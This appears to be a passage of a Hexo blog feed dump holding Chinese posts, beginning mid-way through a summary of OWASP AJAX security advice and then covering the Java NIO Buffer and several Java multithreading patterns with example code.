<h4 id="将数据传递个消费者之前，先规范化（即：使用前先编码）"><a href="#将数据传递个消费者之前，先规范化（即：使用前先编码）" class="headerlink" title="将数据传递个消费者之前，先规范化（即：使用前先编码）"></a>将数据传递个消费者之前，先规范化（即：使用前先编码）</h4><p>当使用数据构建HTML、脚本、CSS、XML和JSON等数据时，确保考虑到如何以字面意义呈现这些数据, 以保持其逻辑含义。</p>
<p>数据在使用之前应该确保合理地编码以方式注入等问题。</p>
<h4 id="不要依赖客户端逻辑来确保安全"><a href="#不要依赖客户端逻辑来确保安全" class="headerlink" title="不要依赖客户端逻辑来确保安全"></a>不要依赖客户端逻辑来确保安全</h4><p>不要忘记用户控制着客户端的逻辑。他们可以通过一些浏览器插件来设置断点，跳过代码，修改值等。永远不要依赖客户端逻辑。</p>
<h4 id="不要依赖客户端的业务逻辑"><a href="#不要依赖客户端的业务逻辑" class="headerlink" title="不要依赖客户端的业务逻辑"></a>不要依赖客户端的业务逻辑</h4><p>确保服务端实现了和客户端一样的业务逻辑或者规则，以免客户端逻辑被绕过并做出一些愚蠢、糟糕和昂贵的事情。</p>
<h4 id="避免编写序列化代码"><a href="#避免编写序列化代码" class="headerlink" title="避免编写序列化代码"></a>避免编写序列化代码</h4><p>这很难，即使是一个小错误也会导致大的安全问题。已经有很多框架提供了这个功能。</p>
<h4 id="避免动态构建XML或者JSON数据"><a href="#避免动态构建XML或者JSON数据" class="headerlink" title="避免动态构建XML或者JSON数据"></a>避免动态构建XML或者JSON数据</h4><p>就像构建HTML或者SQL会硬气XML注入漏洞一样，避免这种情况或者使用一个编码库或者安全的JSON或XML库来确保属性和元素数据安全。</p>
<h4 id="不要向客户端发送机密数据"><a href="#不要向客户端发送机密数据" class="headerlink" title="不要向客户端发送机密数据"></a>不要向客户端发送机密数据</h4><p>任何客户端知道的，用户也知道，因此，将机密的信息放在服务端比较好。</p>
<h4 id="不要在客户端进行加密"><a href="#不要在客户端进行加密" class="headerlink" title="不要在客户端进行加密"></a>不要在客户端进行加密</h4><p>使用TLS/SSL并且在服务端加密</p>
<h4 id="不要在客户端执行影响安全的逻辑"><a href="#不要在客户端执行影响安全的逻辑" class="headerlink" title="不要在客户端执行影响安全的逻辑"></a>不要在客户端执行影响安全的逻辑</h4><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><h4 id="使用CSRF保护措施"><a href="#使用CSRF保护措施" class="headerlink" title="使用CSRF保护措施"></a>使用CSRF保护措施</h4><h4 id="防止旧浏览器的JSON劫持"><a href="#防止旧浏览器的JSON劫持" class="headerlink" title="防止旧浏览器的JSON劫持"></a>防止旧浏览器的JSON劫持</h4><p>参考Angular JS的JSON劫持防御机制，参见<a href="https://docs.angularjs.org/api/ng/service/$http" target="_blank" rel="noopener">JSON Vulnerability Protection</a></p>
<p>总是让外部原语成为JSON字符串的对象：</p>
<p><strong>可以利用的</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"object"</span>: <span class="string">"inside an array"</span>&#125;]</span><br></pre></td></tr></table></figure>

<p><strong>不可以利用的</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"object"</span>: <span class="string">"not inside an array"</span>&#125;</span><br></pre></td></tr></table></figure>

<p><strong>同样不可利用的</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"result"</span>: [&#123;<span class="attr">"object"</span>: <span class="string">"inside an array"</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h4 id="避免写序列化的代码。记住引用类型和值类型的区别"><a href="#避免写序列化的代码。记住引用类型和值类型的区别" class="headerlink" title="避免写序列化的代码。记住引用类型和值类型的区别"></a>避免写序列化的代码。记住引用类型和值类型的区别</h4><p>使用一个经过检验的库</p>
<h4 id="服务可以直接被用户调用"><a href="#服务可以直接被用户调用" class="headerlink" title="服务可以直接被用户调用"></a>服务可以直接被用户调用</h4><p>用户和AJAX客户端代码一样，可以调用服务端服务。确保服务端校验了输入数据。</p>
<h4 id="避免手动凭借XML或者JSON数据，使用框架"><a href="#避免手动凭借XML或者JSON数据，使用框架" class="headerlink" title="避免手动凭借XML或者JSON数据，使用框架"></a>避免手动凭借XML或者JSON数据，使用框架</h4><p>使用安全的框架，不要手工拼接，这可能引起安全问题。</p>
<h4 id="对WebServices使用XML和JSON模式"><a href="#对WebServices使用XML和JSON模式" class="headerlink" title="对WebServices使用XML和JSON模式"></a>对WebServices使用XML和JSON模式</h4><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/AJAX_Security_Cheat_Sheet.md" target="_blank" rel="noopener">https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/AJAX_Security_Cheat_Sheet.md</a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>AJAX</tag>
      </tags>
  </entry>
  <entry>
    <title>NIO-Buffer</title>
    <url>/2018/12/30/Java/NIO/JAVA-NIO-000001-Buffer/</url>
    <content><![CDATA[<h1 id="缓冲区-Buffer"><a href="#缓冲区-Buffer" class="headerlink" title="缓冲区-Buffer"></a>缓冲区-Buffer</h1><p>一个Buffer对象是固定数量的数据的容器。其作用是一个存储器，或者分段运输区，在这里数据可被存储并在之后用于检索。</p>
<p>下图是Buffer的类层次图。在顶部是通用Buffer类。Buffe定义所有缓冲区类型共有的操作，无论是它们所包含的数据类型还是可能具有的特定的行为。</p>
<p><img src="https://huhansi.github.io/images/2020-03-01-buffer-classes.png" alt="Buffer类及其子类"></p>
<h2 id="缓冲区基础"><a href="#缓冲区基础" class="headerlink" title="缓冲区基础"></a>缓冲区基础</h2><p>概念上，缓冲区时报在一个对象内的基本数据元素数组。Buffer类相比一个简单数组的优点是它将关于数据的数据内容和信息包含在一个单一的对象中。Buffer类以及它专有的子类定义了一个用于处理数据缓冲区的API。</p>
<h3 id="缓冲区属性"><a href="#缓冲区属性" class="headerlink" title="缓冲区属性"></a>缓冲区属性</h3><p>所有的缓冲区都具有四个属性来提供关于其所包含的数据元素的信息，分别是：</p>
<h4 id="容量（Capacity）"><a href="#容量（Capacity）" class="headerlink" title="容量（Capacity）"></a>容量（Capacity）</h4><p>缓冲区能够容纳的数据元素的最大个数。这个容量在缓冲区创建的时候就被指定，并且无法改变。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">官方说明</span><br><span class="line">&lt;p&gt; A buffer&#39;s &lt;i&gt;capacity&lt;&#x2F;i&gt; is the number of elements it contains.  The</span><br><span class="line"> *   capacity of a buffer is never negative and never changes.  &lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<h4 id="上限（Limit）"><a href="#上限（Limit）" class="headerlink" title="上限（Limit）"></a>上限（Limit）</h4><p>缓冲区的第一个不能被读或者写的元素。或者说，缓冲区中现存元素的计数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">官方说明</span><br><span class="line">&lt;p&gt; A buffer&#39;s &lt;i&gt;limit&lt;&#x2F;i&gt; is the index of the first element that should</span><br><span class="line"> *   not be read or written.  A buffer&#39;s limit is never negative and is never</span><br><span class="line"> *   greater than its capacity.  &lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<h4 id="位置（Position）"><a href="#位置（Position）" class="headerlink" title="位置（Position）"></a>位置（Position）</h4><p>下一个即将要被读或者写的元素的位置。位置会自动由响应的get()和put()函数更新。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">官方说明</span><br><span class="line">&lt;p&gt; A buffer&#39;s &lt;i&gt;position&lt;&#x2F;i&gt; is the index of the next element to be</span><br><span class="line"> *   read or written.  A buffer&#39;s position is never negative and is never</span><br><span class="line"> *   greater than its limit.  &lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<h4 id="标记（Mark）"><a href="#标记（Mark）" class="headerlink" title="标记（Mark）"></a>标记（Mark）</h4><p>一个备忘位置。调用mark()来设定mark = position。调用reset()设定position = mark。标记在设定前是未定义的。一旦被定义，其值用不可能大于当前的position和非负数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">官方说明</span><br><span class="line">&lt;p&gt; A buffer&#39;s &lt;i&gt;mark&lt;&#x2F;i&gt; is the index to which its position will be reset</span><br><span class="line"> * when the &#123;@link #reset reset&#125; method is invoked.  The mark is not always</span><br><span class="line"> * defined, but when it is defined it is never negative and is never greater</span><br><span class="line"> * than the position.  If the mark is defined then it is discarded when the</span><br><span class="line"> * position or the limit is adjusted to a value smaller than the mark.  If the</span><br><span class="line"> * mark is not defined then invoking the &#123;@link #reset reset&#125; method causes an</span><br><span class="line"> * &#123;@link InvalidMarkException&#125; to be thrown.</span><br></pre></td></tr></table></figure>

<p>这四个属性之间总是遵循下面的关系：<br>0 &lt;= mark &lt;= postion &lt;= limit &lt;= capacity</p>
]]></content>
      <categories>
        <category>java NIO</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>Thread-Specific-Storage模式</title>
    <url>/2018/10/26/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/11.Thread-Specific-Storage/</url>
    <content><![CDATA[<h2 id="Thread-Specific-Storage模式"><a href="#Thread-Specific-Storage模式" class="headerlink" title="Thread-Specific-Storage模式"></a>Thread-Specific-Storage模式</h2><p>Thread-Specific-Storage是一种即使只有一个入口，也会在内部为每个线程分配特有的存储空间的模式。</p>
<p>在Java标准类库中，java.lang.ThreadLocal类实现了该模式。</p>
<h2 id="关于ThreadLocal类"><a href="#关于ThreadLocal类" class="headerlink" title="关于ThreadLocal类"></a>关于ThreadLocal类</h2><h3 id="java-lang-ThreadLocal就是储物间"><a href="#java-lang-ThreadLocal就是储物间" class="headerlink" title="java.lang.ThreadLocal就是储物间"></a>java.lang.ThreadLocal就是储物间</h3><p>将java.lang.ThreadLocal的实例当做一种集合可能会有助于大家理解它。也就是说，一个ThreadLocal的实例会管理多个对象。</p>
<p>由于一个ThreadLocal的实例可以管理多个多想，所有ThreadLocal定义了可以“存储”（set）和“获取”（get）对象的方法。</p>
<h3 id="Set方法"><a href="#Set方法" class="headerlink" title="Set方法"></a>Set方法</h3><p>ThreadLocal类的set方法用于将通过参数接受的实例与调用该方法的线程（当前线程）对应并存储起来。这里存储的对象可以通过get方法获取。set方法中没有表示线程的参数。set方法会先查询当前线程（即表达式Thread.currentThread()的值），然后以它作为键来存储实例。</p>
<h3 id="get方法"><a href="#get方法" class="headerlink" title="get方法"></a>get方法</h3><p>ThreadLocal类的get方法用于获取与调用get方法的线程（当前线程）对应的实例。该线程之前通过set方法存储的实例就是get方法的返回值。如果之前一次都还没有调用过set方法，则get方法的返回值为null。</p>
<p>与set方法一样，get方法中也没有表示线程的参数。这是因为，get方法也回去查询当前线程。即get方法会以当前线程自身作为键取获取对象。</p>
<h3 id="java-lang-ThreadLocal与泛型"><a href="#java-lang-ThreadLocal与泛型" class="headerlink" title="java.lang.ThreadLocal与泛型"></a>java.lang.ThreadLocal与泛型</h3><p>java.lang.ThreadLocal是一个泛型类，可以通过参数的类型来指定要存储的对象的类型。ThreadLocal类的声明大致如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadLocal</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T value)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即，通过ThreadLocal<T>的T指定的类型就是set方法的参数的类型以及get方法的返回值的类型。</T></p>
<h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>TsLog</td>
<td>创建日志的类（实例属于各个线程所有）</td>
</tr>
<tr>
<td>Log</td>
<td>创建日志的类（分配各个线程）</td>
</tr>
<tr>
<td>java.lang.ThreadLocal</td>
<td>分配线程特有的存储空间的类</td>
</tr>
<tr>
<td>ClientThread</td>
<td>表示调用Log的线程的类</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
</tbody></table>
<h3 id="TSLog类"><a href="#TSLog类" class="headerlink" title="TSLog类"></a>TSLog类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TSLog</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> PrintWriter printWriter = <span class="keyword">null</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">TSLog</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			printWriter = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> FileWriter(fileName));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		printWriter.println(s);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		printWriter.println(<span class="string">"==== End of log ===="</span>);</span><br><span class="line">		printWriter.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Log类"><a href="#Log类" class="headerlink" title="Log类"></a>Log类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Log</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;TSLog&gt; tsLogCollection = <span class="keyword">new</span> ThreadLocal&lt;&gt;();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		getTSLog().println(s);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		getTSLog().close();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> TSLog <span class="title">getTSLog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		TSLog tsLog = tsLogCollection.get();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == tsLog) &#123;</span><br><span class="line">			tsLog = <span class="keyword">new</span> TSLog(Thread.currentThread().getName() + <span class="string">"-log.txt"</span>);</span><br><span class="line">			tsLogCollection.set(tsLog);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> tsLog;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ClientThread类"><a href="#ClientThread类" class="headerlink" title="ClientThread类"></a>ClientThread类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ClientThread</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(getName() + <span class="string">" Begin"</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++) &#123;</span><br><span class="line">			Log.println(<span class="string">"i = "</span> + i);</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Thread.sleep(<span class="number">100</span>);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		Log.close();</span><br><span class="line">		System.out.println(getName() + <span class="string">" End"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">new</span> ClientThread(<span class="string">"A"</span>).start();</span><br><span class="line">		<span class="keyword">new</span> ClientThread(<span class="string">"B"</span>).start();</span><br><span class="line">		<span class="keyword">new</span> ClientThread(<span class="string">"C"</span>).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>java</tag>
        <tag>设计模式</tag>
        <tag>Thread-Specific-Storage模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Active Object模式</title>
    <url>/2018/10/26/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/12.Active%20Object/</url>
    <content><![CDATA[<h2 id="Active-Object模式"><a href="#Active-Object模式" class="headerlink" title="Active Object模式"></a>Active Object模式</h2><p>Active是“主动的”意思，因此Active Object就是“主动对象”的意思。所谓的“主动的”，一般指“有自己特有的线程”。因此，举例来说，Java的java.lang.Thread类的实例就是一种主动对象。</p>
<p>不过，在Active Object模式中出厂的主动对象可不仅仅“有自己特有的线程”。它同时还具有可以从外部接受和处理异步消息并根据需要返回处理结果的特征。</p>
<p>Active Object模式中的主动对象会通过自己特有的线程在适合的时机处理从外部接受到的异步消息。</p>
<p>在Active Object模式中，组成主动对象与许多自然人组成法人类似。及时是Java语言这种没有异步消息的编程语言，也可以使用Active Object模式组成实际上能够处理异步消息的主动对象。</p>
<h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><p>主动对象由ActiveObjectFactory类创建，实现了ActiveObject接口。使用主动对象的线程时MakerClientThread类和DisplayClientThread类。这些线程会各自向主动对象发送异步的“生成字符串”和“显示字符串”的请求。<br>| 包 | 名字 | 说明  |<br>| —- | —- | —- |<br>| 无名 | Main | 测试程序行为的类 |<br>| 无名 | MakerClientThread | 发出“生成字符串”请求的线程 |<br>| activeObject  | DisplayClientThread | 发出“显示字符串”请求的线程 |<br>| activeObject  | ActiveObject | 定义“主动对象”的接口（API）的接口 |<br>| activeObject  | ActiveObjectFactory | 创建“主动对象”的类 |<br>| activeObject  | Proxy | 将方法调用转换为MethodRequest对象的类（实现了ActiveObject的接口） |<br>| activeObject  | SchedulerThread | 调用ececute方法处理MethodRequest对象的类 |<br>| activeObject  | ActivationQueue | 按顺序保存MethodRequest对象的类 |<br>| activeObject  | MethodRequest | 表示请求的抽象类 |<br>| activeObject  | MakeStringRequest | makeString方法（生成字符串）对应的类。MethodRequest的子类 |<br>| activeObject  | DisplayStringRequest | displayString方法（显示字符串）对应的类。MethodRequest的子类 |<br>| activeObject  | Result | 表示执行结果的抽象类 |<br>| activeObject  | FutureResult | 在Future模式中表示执行结果的类 |<br>| activeObject  | RealResult | 表示实际的执行结果的类 |<br>| activeObject  | Servant | 执行实际处理的类（实现了ActiveObject接口） |</p>
<h3 id="调用方：MakerClientThread类"><a href="#调用方：MakerClientThread类" class="headerlink" title="调用方：MakerClientThread类"></a>调用方：MakerClientThread类</h3><p>MakerClientThread类是调用主动对象的makeString方法（生成字符串）的线程。</p>
<p>activeObject字段中保存的是ActiveObject对象。MakerClientThread类会调用该对象的makeString方法。</p>
<p>makeString方法会在被调用后立即返回。这里的调用相当于将“生成字符串”这个异步消息传递给主动对象。</p>
<p>虽然makeString的返回值是Result类型，但是实际上这里使用的是Future模式。使用getResultValue方法可以获取实际的返回值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MakerClientThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> ActiveObject activeObject;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">char</span> fillChar;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MakerClientThread</span><span class="params">(String name, ActiveObject activeObject)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.activeObject = activeObject;</span><br><span class="line">		<span class="keyword">this</span>.fillChar = name.charAt(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;<span class="keyword">true</span>;i++) &#123;</span><br><span class="line">				Result&lt;String&gt; result = activeObject.makeString(i, fillChar);</span><br><span class="line">				Thread.sleep(<span class="number">10</span>);</span><br><span class="line">				String value = result.getResultValue();</span><br><span class="line">				System.out.println(Thread.currentThread().getName() + <span class="string">": value = "</span> + value);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			System.out.println(e.getMessage());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="调用方："><a href="#调用方：" class="headerlink" title="调用方："></a>调用方：</h3>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>java</tag>
        <tag>设计模式</tag>
        <tag>Active Object模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Two-Phase-Termination模式</title>
    <url>/2018/10/14/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/10.Two-Phase-Termination/</url>
    <content><![CDATA[<h2 id="Two-Phase-Termination模式"><a href="#Two-Phase-Termination模式" class="headerlink" title="Two-Phase-Termination模式"></a>Two-Phase-Termination模式</h2><p>该模式的名字直译为中文是“分两段终止”的意思。它是一种先执行完终止处理再终止线程的模式。</p>
<p>我们称线程在进行正常处理时的状态为“操作中”。在要停止该线程时，我们会发出“终止请求”。这样，线程就不会突然终止，而是会先开始进行“打扫工作”。我们称这种状态为“终止处理中”。从“操作中”变为“终止处理中”是线程终止的第一阶段。</p>
<p>在“终止处理中”状态下，线程不会再进行正常操作了。它虽然仍然在运行，但是只会进行终止处理。终止处理完成后，就会真正地终止线程。“终止处理中”状态结束时线程终止的第二阶段。</p>
<p>先从“操作中”变为“终止处理中”状态，然后再真正地终止线程。</p>
<p>该模式的要点如下：</p>
<ol>
<li>安全地终止线程（安全性）</li>
<li>必定会进行终止处理（生存型）</li>
<li>发出终止请求后尽快进行终止处理（响应性）</li>
</ol>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>CountupThread</td>
<td>表示进行计数的线程的类。</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
</tbody></table>
<h3 id="CountupThread类"><a href="#CountupThread类" class="headerlink" title="CountupThread类"></a>CountupThread类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CountupThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">long</span> counter = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> shudownRequested = <span class="keyword">false</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shutdownRequest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		shudownRequested = <span class="keyword">true</span>;</span><br><span class="line">		interrupt();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isShutdownRequested</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> shudownRequested;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (!isShutdownRequested()) &#123;</span><br><span class="line">				doWork();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			doShutdown();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doWork</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		counter++;</span><br><span class="line">		System.out.println(<span class="string">"DoWork: counter = "</span> + counter);</span><br><span class="line">		Thread.sleep(<span class="number">500</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doShutdown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Do shutdown : counter = "</span> + counter);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Main begin"</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			CountupThread t = <span class="keyword">new</span> CountupThread();</span><br><span class="line">			t.start();</span><br><span class="line">			Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">			</span><br><span class="line">			System.out.println(<span class="string">"Main shutdown request"</span>);</span><br><span class="line">			t.shutdownRequest();</span><br><span class="line">			System.out.println(<span class="string">"main join"</span>);</span><br><span class="line">			t.join();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">"Main end"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>java</tag>
        <tag>设计模式</tag>
        <tag>Two-Phase-Termination模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Future模式</title>
    <url>/2018/10/14/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/9.Future%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="Future模式"><a href="#Future模式" class="headerlink" title="Future模式"></a>Future模式</h2><p>Future的意思就是未来、期货（经济学）用语。假设有一个方法需要花费很长时间才能获取运行结果。那么与其一直等待结果，不如先拿一张“提货单”。获取提货单并不耗费时间。这里的“提货单”就称之为Future角色。</p>
